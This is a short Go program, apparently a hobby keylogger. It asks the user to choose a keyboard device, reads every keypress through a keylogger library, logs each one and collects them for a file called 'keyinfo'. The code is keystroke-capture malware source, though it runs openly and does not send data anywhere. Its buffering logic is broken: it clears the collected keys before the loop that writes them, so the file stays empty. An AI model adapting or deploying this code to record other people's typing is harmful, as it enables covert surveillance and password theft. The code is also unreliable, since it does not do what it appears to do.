package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/MarinX/keylogger"
	"github.com/sirupsen/logrus"
)

func main() {
	var Inputs []string
	var SelectedKeyboard string
	var Keyboard string
	Keyboards := keylogger.FindAllKeyboardDevices()
	fmt.Println(Keyboards)
	fmt.Println("Enter your keyboard from the options above.")
	fmt.Scanln(&SelectedKeyboard)

	for _, i := range Keyboards {
		if strings.EqualFold(i, SelectedKeyboard) {
			Keyboard = i
			break
		}
	}

	k, err := keylogger.New(Keyboard)

	if err != nil {
		logrus.Fatal("Failed to initialize keylogger:", err)
	} else {
		logrus.Println("Sucessfully initialized the keylogger.")
	}
	defer k.Close()

	events := k.Read()

	amount := 500
	file, file_err := os.Create("keyinfo")

	if file_err != nil {
		logrus.Fatal("Failed to create file:", file_err)
	} else {
		logrus.Println("Sucessfully created the keyinfo file.")
	}

	for e := range events {
		if e.KeyPress() {
			logrus.Println("Registered key press event: ", e.KeyString())
			Inputs = append(Inputs, e.KeyString())
			amount -= 1
		}
		if amount <= 1 {
			amount = 500
			Inputs = nil

			for _, i := range Inputs {
				file.WriteString(i)
			}
		}
	}
}
